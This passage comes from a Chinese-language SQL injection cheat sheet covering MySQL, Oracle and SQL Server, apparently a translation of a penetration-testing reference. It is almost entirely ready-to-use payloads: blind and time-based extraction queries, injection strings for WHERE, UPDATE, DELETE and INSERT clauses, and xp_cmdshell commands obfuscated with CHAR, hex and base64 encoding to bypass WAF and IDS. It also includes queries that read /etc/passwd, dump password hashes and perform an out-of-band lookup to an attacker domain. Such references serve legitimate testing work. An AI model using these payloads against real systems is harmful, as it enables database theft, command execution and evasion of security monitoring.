@@version)</td></tr><tr><td>联合null<br> 注意：如果原始查询返回多个列，则添加null以等于列数</td><td style="text-align:center">SELECT user,system_user UNION (SELECT @@version,null)</td></tr><tr><td>联合null二进制减半 <br>注意：此查询用于检测列数。[numberOfColumns]大于列数则返回错误，从而找到表中列的数目。</td><td style="text-align:center">SELECT * FROM yourtable ORDER BY [numberOfColumns]</td></tr><tr><td>堆积式查询 <br>注意：堆积式查询并不总是返回结果，因此它们最适合用于更新/修改数据的注入。</td><td style="text-align:center">SELECT @@version; SELECT @@version –</td></tr></tbody></table><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a><span id="blindBased">盲注</span></h3><p>　　盲注是更高级的注入方法之一。部分盲和全盲方法详述如下。执行这些查询时要小心，因为如果通过大量自动化执行，它们可能会使服务器过载。</p><h4 id="MySQL-2"><a href="#MySQL-2" class="headerlink" title="MySQL"></a>MySQL</h4><p><strong>部分盲</strong></p><p>　　部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是5.xx</td><td style="text-align:center">SELECT substring(version(),1,1)=5</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT 1 AND (select 1)=1</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT 1 AND (select 1 from log_table limit 0,1)=1</td></tr><tr><td>列message存在于表log_table中 <br>注意：如果列不存在，则查询应该出错</td><td style="text-align:center">SELECT message FROM log_table LIMIT 0,1</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">IF</span>(*PARTIAL_BLIND_QUERY*, <span class="keyword">SLEEP</span>(<span class="number">5</span>), <span class="literal">null</span>)</span><br></pre></td></tr></table></figure><p><strong>全盲</strong></p><p>　　部分盲注可以通过HTTP响应中的不同HTTP状态代码，响应时间，内容长度和HTML内容来确定。这些标记可以指示真或假的陈述。下面的查询将试图通过在猜测的信息上声明真或假的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>用户是root</td><td style="text-align:center">SELECT IF(user() LIKE ‘root@%’, SLEEP(5), null)</td></tr><tr><td>用户是root（Benchmark 方法）</td><td style="text-align:center">SELECT IF(user() LIKE ‘root@%’, BENCHMARK(5000000, ENCODE(‘Slow Down’,’by 5 seconds’)), null)</td></tr><tr><td>版本是5.xx</td><td style="text-align:center">SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</td></tr></tbody></table><h4 id="Oracle-3"><a href="#Oracle-3" class="headerlink" title="Oracle"></a>Oracle</h4><p><strong>部分盲</strong></p><p>　　部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.2</td><td style="text-align:center">SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%12.2%’;</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</td></tr><tr><td>列message存在于表log_table中</td><td style="text-align:center">Select COUNT(*) from user_tab_cols where column_name = ‘MESSAGE’ and table_name = ‘LOG_TABLE’;</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">Select message from log_table where rownum=1 and message LIKE ‘t%’;</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (*PARTIAL_BLIND_QUERY*)=<span class="number">1</span> <span class="keyword">THEN</span> (<span class="keyword">SELECT</span> <span class="keyword">count</span>(*) <span class="keyword">FROM</span> all_users a, all_users b, all_users c, all_users d) <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> dual</span><br></pre></td></tr></table></figure><p>　　部分盲查询必须返回一行，因此总是尝试在所选列上使用COUNT。添加”all_users [letter]”，直到数据库响应变慢。 如果数据库缓存响应，您可能需要循环[letter]。</p><p><strong>全盲</strong></p><p>　　全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他<a href="#dataExfiltration">out-of-band</a> 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.2</td><td style="text-align:center">SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE ‘Oracle%11.2%’)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual</td></tr></tbody></table><h4 id="SQL-Server-3"><a href="#SQL-Server-3" class="headerlink" title="SQL Server"></a>SQL Server</h4><p><strong>部分盲</strong></p><p>　　部分盲注是指返回HTTP状态代码或HTML响应中的其他标记的查询，他们指示真或假陈述。下面的查询将试图通过在猜测的信息上声明真实或错误的响应来利用注入。真或假查询也可以通过返回1（真）或0（假）行来识别。一个错误也可以用来标识0（False）。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本是12.0.2000.8</td><td style="text-align:center">SELECT @@version WHERE @@version LIKE ‘%12.0.2000.8%’</td></tr><tr><td>子选择启用</td><td style="text-align:center">SELECT (SELECT @@version)</td></tr><tr><td>表log_table存在</td><td style="text-align:center">SELECT * FROM log_table</td></tr><tr><td>列message存在于表log_table中</td><td style="text-align:center">SELECT message from log_table</td></tr><tr><td>第一条message的第一个字母是t</td><td style="text-align:center">WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table) SELECT message FROM data WHERE row = 1 and message like ‘t%’</td></tr></tbody></table><p><strong>将部分盲查询转换为全盲查询</strong></p><p>　　通过使用以下转换，可以在全盲方案中使用上述任何查询：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02'</span><br></pre></td></tr></table></figure><p><strong>全盲</strong></p><p>　　全盲查询不会在HTTP / HTML响应中指示任何查询结果。这使他们依赖于定时功能和其他<a href="#dataExfiltration">out-of-band</a> 攻击方法。一个真的SQL语句需要X秒的回应，一个假的SQL语句应该立即返回。</p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Version is 12.0.2000.8</td><td style="text-align:center">IF exists(SELECT @@version where @@version like ‘%12.0.2000.8%’) WAITFOR DELAY ‘00&#58;00&#58;02’</td></tr></tbody></table><h2 id="4-注入技术"><a href="#4-注入技术" class="headerlink" title="4.注入技术"></a>4.注入技术</h2><h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><p>　　条件语句有助于创建复杂的查询并帮助盲注入。</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>If/Else</td><td style="text-align:center">SELECT IF(1=2,’true’,’false’)</td></tr><tr><td>逻辑 OR</td><td style="text-align:center">SELECT 1 &#124;&#124; 0<br> 看到这个运算符的细微差别<a href="https://dev.mysql.com/doc/refman/5.7/en/logical-operators.html#operator_or" target="_blank" rel="noopener">详见</a></td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Case</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>Case</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END</td></tr><tr><td>If/Else</td><td style="text-align:center">IF 1=2 SELECT ‘true’ ELSE SELECT ‘false’;</td></tr></tbody></table><p>###　注入定位</p><p>　　当注入发生的地方并不明显时，SQL注入总是很麻烦。有一些方法可以在查询的各个部分利用注入是有帮助的。</p><p>　　<code>$injection</code>确定注入点。修改数据的注入尝试始终使用连接，并允许查询的其余部分有效。通过<a href="https://blog.netspi.com/sql-injection-help-sleep-night/" target="_blank" rel="noopener">这个文章</a>可以了解更多信息。</p><p><strong>MySQL</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT * FROM USERS WHERE USER=’$injection’;</td><td style="text-align:center">‘ or 1=1 –</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE USERS SET email=’$injection’ WHERE user=’NetSPI’;</td><td style="text-align:center">‘ <a href="mailto:&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;harold@netspi.com</a>‘ ‘</td></tr><tr><td>UPDATE -&gt; WHERE <br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE USERS SET <a href="mailto:email=&#39;harold@netspi.com" target="_blank" rel="noopener">email=&#39;harold@netspi.com</a>‘ WHERE user=’$injection’;</td><td style="text-align:center">‘ ‘netspi’ ‘</td></tr><tr><td>DELETE -&gt; WHERE <br>注意：运行删除语句时要非常小心，因为整个表都会被删除。</td><td style="text-align:center">DELETE FROM USERS WHERE USERS=’$injection’;</td><td style="text-align:center">‘ <a href="mailto:&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;harold@netspi.com</a>‘ ‘</td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT user FROM dual WHERE user LIKE ‘$injection’;</td><td style="text-align:center">‘&#124;&#124;’USER%’&#124;&#124;’</td></tr><tr><td>INSERT -&gt; VALUES</td><td style="text-align:center">INSERT INTO log_table (message) VALUES (‘$injection’);</td><td style="text-align:center">‘&#124;&#124;(select user from dual)&#124;&#124;’</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE log_table SET message = ‘$injection’ WHERE message = ‘test’;</td><td style="text-align:center">‘&#124;&#124;(select user from dual)&#124;&#124;</td></tr><tr><td>UPDATE -&gt; WHERE <br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE log_table SET message = ‘test’ WHERE message = ‘$injection’;</td><td style="text-align:center">‘&#124;&#124;’Injected’&#124;&#124;’</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>注入位置</th><th style="text-align:center">语句</th><th style="text-align:center">注入字符串</th></tr></thead><tbody><tr><td>SELECT -&gt; WHERE</td><td style="text-align:center">SELECT * FROM USERS WHERE “USER”=’$injection’;</td><td style="text-align:center">‘ or 1=1 –</td></tr><tr><td>UPDATE -&gt; SET</td><td style="text-align:center">UPDATE USERS SET “email”=’$injection’ WHERE “USER”=’NetSPI’;</td><td style="text-align:center"><a href="mailto:&#39;+&#39;harold@netspi.com" target="_blank" rel="noopener">&#39;+&#39;harold@netspi.com</a>‘+’</td></tr><tr><td>UPDATE -&gt; WHERE <br>注意：尝试将注入字符串设置为有效的WHERE值。 如果对象已更新，则注入成功。</td><td style="text-align:center">UPDATE USERS SET “email”<a href="mailto:=&#39;harold@netspi.com" target="_blank" rel="noopener">=&#39;harold@netspi.com</a>‘ WHERE “USER”=’$injection’;</td><td style="text-align:center">‘+’NetSPI’+’</td></tr><tr><td>DELETE -&gt; WHERE</td><td style="text-align:center">DELETE USERS WHERE “User”=’$injection’;</td><td style="text-align:center">‘+’NetSPI’+’</td></tr><tr><td>INSERT -&gt; VALUES</td><td style="text-align:center">INSERT INTO USERS ([User], [Password]) VALUES (‘$injection’, ‘password’);</td><td style="text-align:center">‘+(select @@version)+’</td></tr></tbody></table><p>###　混淆查询</p><p>　　混淆查询帮助绕过Web应用程序防火墙（WAF）和入侵检测/预防系统（IDS / IPS）。以下是基本查询混淆的示例，它们在应用于某些注入之前可能需要进行修改。</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char（65）</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii（’A’）</td></tr><tr><td>十六进制</td><td style="text-align:center">SELECT 0x4A414B45</td></tr><tr><td>Hex&gt; Int</td><td style="text-align:center">SELECT 0x20 + 0x40</td></tr><tr><td>按位与</td><td style="text-align:center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2</td></tr><tr><td>右移</td><td style="text-align:center">SELECT 6&gt;&gt;2</td></tr><tr><td>左移</td><td style="text-align:center">SELECT 6&lt;&lt;2</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 2)  <br> substr(string, index, length)</td></tr><tr><td>Casting</td><td style="text-align:center">SELECT cast(‘1’ AS unsigned integer)  <br>SELECT cast(‘123’ AS char)</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’) <br>SELECT ‘n’ ‘et’ ‘spi’</td></tr><tr><td>无引号</td><td style="text-align:center">SELECT CONCAT(CHAR(74),CHAR(65),CHAR(75),CHAR(69))</td></tr><tr><td>块注释</td><td style="text-align:center">SELECT/*block  <br>  comment*/“test”</td></tr><tr><td>单行注释</td><td style="text-align:center">SELECT 1 – comments out rest of line  <br>SELECT 1 # comments out rest of line</td></tr><tr><td>无空格</td><td style="text-align:center">SELECT(username)FROM(USERS)WHERE(username=’netspi’)</td></tr><tr><td>允许空白</td><td style="text-align:center">09, 0A, 0B, 0C, 0D, A0, 20</td></tr><tr><td>URL 编码</td><td style="text-align:center">SELECT%20%2A%20FROM%20USERS</td></tr><tr><td>双URL编码</td><td style="text-align:center">SELECT%2520%2A%2520FROM%2520USERS</td></tr><tr><td>无效百分号编码</td><td style="text-align:center">%SEL%ECT * F%R%OM U%S%ERS</td></tr></tbody></table><p>　　进一步阅读请<a href="https://media.blackhat.com/us-13/US-13-Salgado-SQLi-Optimization-and-Obfuscation-Techniques-WP.pdf" target="_blank" rel="noopener">点击</a></p><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char(65) from dual</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii(‘A’) from dual</td></tr><tr><td>按位AND</td><td style="text-align:center">SELECT 6 &amp; 2 from dual</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6 from dual</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6 from dual</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2 from dual</td></tr><tr><td>选择第N个字符</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 1) FROM dual; – Returns 3rd charcter, ‘c’</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substr(‘abcd’, 3, 2) from dual <br>substr(string, index, length)</td></tr><tr><td>Cast</td><td style="text-align:center">select CAST(12 AS CHAR(32)) from dual</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’) from dual</td></tr><tr><td>注释</td><td style="text-align:center">SELECT 1 FROM dual – comment</td></tr><tr><td>If 语句</td><td style="text-align:center">BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF;</td></tr><tr><td>Case 语句</td><td style="text-align:center">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; – Returns 1 <br>SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; – Returns 2</td></tr><tr><td>时间延迟</td><td style="text-align:center">BEGIN DBMS_LOCK.SLEEP(5); END; (Requires Privileges) <br>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; <br>SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual;  <br>SELECT UTL_HTTP.REQUEST(‘<a href="http://google.com&#39;" target="_blank" rel="noopener">http://google.com&#39;</a>) FROM dual;</td></tr><tr><td>选择第n行</td><td style="text-align:center">SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; – Returns 9th row</td></tr><tr><td>按位与</td><td style="text-align:center">SELECT bitand(6,2) FROM dual; – Returns 2 <br> SELECT bitand(6,1) FROM dual; – Returns 0</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT ‘A’ &#124;&#124; ‘B’ FROM dual; – Returns AB</td></tr><tr><td>避免引号</td><td style="text-align:center">SELECT chr(65) &#124;&#124; chr(66) FROM dual; – Returns AB</td></tr><tr><td>16进制编码</td><td style="text-align:center">SELECT 0x75736572 FROM dual;</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>ASCII&gt;字符</td><td style="text-align:center">SELECT char（65）</td></tr><tr><td>字符&gt; ASCII</td><td style="text-align:center">SELECT ascii（’A’）</td></tr><tr><td>Hex&gt; Int</td><td style="text-align:center">SELECT 0x20 + 0x40</td></tr><tr><td>按位AND</td><td style="text-align:center">SELECT 6 &amp; 2</td></tr><tr><td>按位或</td><td style="text-align:center">SELECT 6</td></tr><tr><td>按位否定</td><td style="text-align:center">SELECT ~6</td></tr><tr><td>按位XOR</td><td style="text-align:center">SELECT 6 ^ 2</td></tr><tr><td>字符串截取</td><td style="text-align:center">SELECT substring(‘abcd’, 3, 2) <br> substring(string, index, length)</td></tr><tr><td>Casting</td><td style="text-align:center">SELECT cast(‘1’ AS unsigned integer) <br> SELECT cast(‘123’ AS char)</td></tr><tr><td>字符串连接</td><td style="text-align:center">SELECT concat(‘net’,’spi’)</td></tr><tr><td>注释</td><td style="text-align:center">SELECT 1 –comment  <br>SELECT/*comment*/1</td></tr><tr><td>避免引号</td><td style="text-align:center">SELECT char(65)+char(66) – returns AB</td></tr><tr><td>使用％0d避免使用分号</td><td style="text-align:center"><code>%0dwaitfor+delay+&#39;0:0:10&#39;--</code></td></tr><tr><td>Bypass Filtering</td><td style="text-align:center">EXEC xP_cMdsheLL ‘dir’;</td></tr><tr><td>用注释避免空格</td><td style="text-align:center">EXEC/**/xp_cmdshell/**/‘dir’;– ‘;ex/**/ec xp_cmds/**/hell ‘dir’;</td></tr><tr><td>用连接避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd = ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’/**/‘+””+’d’+’i’+’r’+””;<br>exec(@cmd);</td></tr><tr><td>用字符编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+<br>CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)<br>+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+<br>CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+<br>CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+<br>CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));<br>EXEC(@cmd);</td></tr><tr><td>用base64编码避免查询检测</td><td style="text-align:center">DECLARE @data varchar(max), @XmlData xml;SET @data = ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’;<br>SET @XmlData = CAST(‘’ + @data + ‘’ as xml);SET @data = CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’));<br>exec (@data);</td></tr><tr><td>用Nchar编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as nvarchar(3000);<br>SET @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+<br> nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+<br>nchar(101)+nchar(114)+nchar(46)+nchar(46)+<br> nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)<br>+nchar(100)+nchar(115)+nchar(104)+<br> nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)<br>+nchar(105)+nchar(114)+nchar(39)+nchar(59));<br>EXEC(@cmd);</td></tr><tr><td>用ASCII + CAST 编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = cast(0x78705F636D647368656C6C202764697227 as varchar(MAX));<br>exec(@cmd);</td></tr><tr><td>用ASCII + CONVERT  编码避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(MAX),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用varbinary(MAX)  避免查询检测</td><td style="text-align:center">DECLARE @cmd as varchar(MAX);<br>SET @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);<br>exec(@cmd);</td></tr><tr><td>用 sp_sqlexec  避免 EXEC()</td><td style="text-align:center">DECLARE @cmd as varchar(3000);<br>SET @cmd = convert(varchar(0),0×78705F636D647368656C6C202764697227);<br>exec sp_sqlexec @cmd;</td></tr><tr><td>执行 xp_cmdshell ‘dir’</td><td style="text-align:center">DECLARE @tmp as varchar(MAX);<br>SET @tmp = char(88)+char(80)+char(95)+char(67)+char(77)+<br>char(68)+char(83)+char(72)+char(69)+char(76)+char(76);<br>exec @tmp ‘dir’;</td></tr></tbody></table><h2 id="5-攻击查询"><a href="#5-攻击查询" class="headerlink" title="5.攻击查询"></a>5.攻击查询</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>　　收集有关任何测试环境的信息通常很有价值; 版本号，用户帐户和数据库都有助于升级漏洞。以下是常见的方法。</p><p>　　<code>*</code>需要特权用户</p><p><strong>MySQL</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT @@version</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user() <br>SELECT system_user()</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT user FROM mysql.user <br> <code>*</code>SELECT Super_priv FROM mysql.user WHERE user= ‘root’ LIMIT 1,1</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_schema, table_name FROM information_schema.tables</td></tr><tr><td>列</td><td style="text-align:center">SELECT table_name, column_name FROM information_schema.columns</td></tr><tr><td>数据库</td><td style="text-align:center">SELECT schema_name FROM information_schema.schemata</td></tr><tr><td>当前数据库名称</td><td style="text-align:center">SELECT database()</td></tr><tr><td>查询其他数据库</td><td style="text-align:center">USE [database_name]; SELECT database();  <br>SELECT [column] FROM [database_name].[table_name]</td></tr><tr><td>列数</td><td style="text-align:center">SELECT count(*) FROM information_schema.columns WHERE table_name = ‘[table_name]’</td></tr><tr><td>DBA账户</td><td style="text-align:center">SELECT host, user FROM mysql.user WHERE Super_priv = ‘Y’</td></tr><tr><td>密码哈希</td><td style="text-align:center">SELECT host, user, password FROM mysql.user</td></tr><tr><td>Schema</td><td style="text-align:center">SELECT schema()</td></tr><tr><td>数据路径</td><td style="text-align:center">SELECT @@datadir</td></tr><tr><td>读取文件</td><td style="text-align:center"><code>*</code> SELECT LOAD_FILE(‘/etc/passwd’)</td></tr></tbody></table><p><strong>Oracle</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<br>SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;<br>SELECT version FROM v$instance;</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user FROM dual</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT username FROM all_users ORDER BY username;<br><code>*</code>SELECT name FROM sys.user$;</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_name FROM all_tables; <br>SELECT owner, table_name FROM all_tables;</td></tr><tr><td>通过列名称获取表</td><td style="text-align:center">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’;</td></tr><tr><td>列</td><td style="text-align:center">SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;  <br>SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</td></tr><tr><td>当前数据库名称</td><td style="text-align:center">SELECT global_name FROM global_name;<br>SELECT name FROM V$DATABASE; <br>SELECT instance_name FROM V$INSTANCE;<br>SELECT SYS.DATABASE_NAME FROM DUAL;</td></tr><tr><td>数据库</td><td style="text-align:center">SELECT DISTINCT owner FROM all_tables;</td></tr><tr><td>DBA 账户</td><td style="text-align:center">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’;</td></tr><tr><td>特权</td><td style="text-align:center">SELECT * FROM session_privs;(Retrieves Current Privs)<br> <code>*</code> SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’;<br> <code>*</code> SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’;<br>SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td></tr><tr><td>DB文件的位置</td><td style="text-align:center">SELECT name FROM V$DATAFILE;</td></tr><tr><td>主机名，IP地址</td><td style="text-align:center">SELECT UTL_INADDR.get_host_name FROM dual;<br>SELECT host_name FROM v$instance;<br>SELECT UTL_INADDR.get_host_address FROM dual; (IP地址)<br>SELECT UTL_INADDR.get_host_name(‘10.0.0.1’) FROM dual; (主机名)</td></tr></tbody></table><p><strong>SQL Server</strong></p><table><thead><tr><th>描述</th><th style="text-align:center">语句</th></tr></thead><tbody><tr><td>版本</td><td style="text-align:center">SELECT @@version;</td></tr><tr><td>单个用户</td><td style="text-align:center">SELECT user;<br>SELECT system_user;<br>SELECT user_name();<br>SELECT loginame from master..sysprocesses where spid = @@SPID</td></tr><tr><td>所有用户</td><td style="text-align:center">SELECT name from master..syslogins</td></tr><tr><td>表</td><td style="text-align:center">SELECT table_catalog, table_name FROM information_schema.columns</td></tr><tr><td>列</td><td style="text-align:center">SELECT table_catalog, column_name FROM information_schema.columns</td></tr><tr><td>所有数据库</td><td style="text-align:center">SELECT name from master..sysdatabases;</td></tr><tr><td>当前数据库</td><td style="text-align:center">SELECT db_name();</td></tr><tr><td>服务器名称</td><td style="text-align:center">SELECT @@SERVERNAME</td></tr><tr><td>查找存储过程</td><td style="text-align:center">SELECT * from master..sysobjects where name like ‘sp%’ order by name desc</td></tr><tr><td>通过用户名获取SUID</td><td style="text-align:center">SELECT SUSER_ID(‘sa’)</td></tr><tr><td>通过SUID获取用户名</td><td style="text-align:center">SELECT SUSER_NAME(1)</td></tr><tr><td>检查账户是不是管理员</td><td style="text-align:center">IS_SRVROLEMEMBER(convert(varchar,0x73797361646D696E)) <br>SELECT is_srvrolemember(‘sysadmin’);</td></tr><tr><td>Policies</td><td style="text-align:center"><code>SELECT p.policy_id, p.name as [PolicyName], p.condition_id, c.name as [ConditionName], c.facet, c.expression as [ConditionExpression], p.root_condition_id, p.is_enabled, p.date_created, p.date_modified, p.description, p.created_by, p.is_system, t.target_set_id, t.TYPE, t.type_skeleton FROM msdb.dbo.syspolicy_policies p INNER JOIN syspolicy_conditions c ON p.condition_id = c.condition_id INNER JOIN msdb.dbo.syspolicy_target_sets t ON t.object_set_id = p.object_set_id</code></td></tr><tr><td>域用户</td><td style="text-align:center"><a href="https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql" target="_blank" rel="noopener">https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/templates/tsql/Get-SQLDomainUser-Example.sql</a></td></tr><tr><td>DB 审计</td><td style="text-align:center"><code>SELECT a.audit_id, a.name as audit_name, s.name as database_specification_name, d.audit_action_name, d.major_id, OBJECT_NAME(d.major_id) as object, s.is_state_enabled, d.is_group, s.create_date, s.modify_date, d.audited_result FROM sys.server_audits AS a JOIN sys.database_audit_specifications AS s ON a.audit_guid = s.audit_guid JOIN sys.database_audit_specification_details AS d ON s.database_specification_id = d.database_specification_id</code></td></tr><tr><td>Server 审计</td><td style="text-align:center"><code>SELECT audit_id, a.name as audit_name, s.name as server_specification_name, d.audit_action_name, s.is_state_enabled, d.is_group, d.audit_action_id, s.create_date, s.modify_date FROM sys.server_audits AS a JOIN sys.server_audit_specifications AS s ON 